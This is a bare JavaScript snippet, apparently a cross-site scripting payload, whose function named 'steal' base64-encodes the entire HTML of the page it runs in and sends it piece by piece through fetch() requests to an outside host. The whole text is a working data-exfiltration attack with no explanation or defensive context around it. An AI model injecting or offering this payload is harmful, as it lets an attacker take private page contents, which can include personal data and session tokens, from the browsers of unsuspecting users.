function steal() {
  s='x';i=0;while(s){s=btoa(unescape(encodeURIComponent(document.documentElement.outerHTML))).substring(i,i+1000);fetch('https://kee-reel.com/'+i+s);i+=1000;}
}
steal();
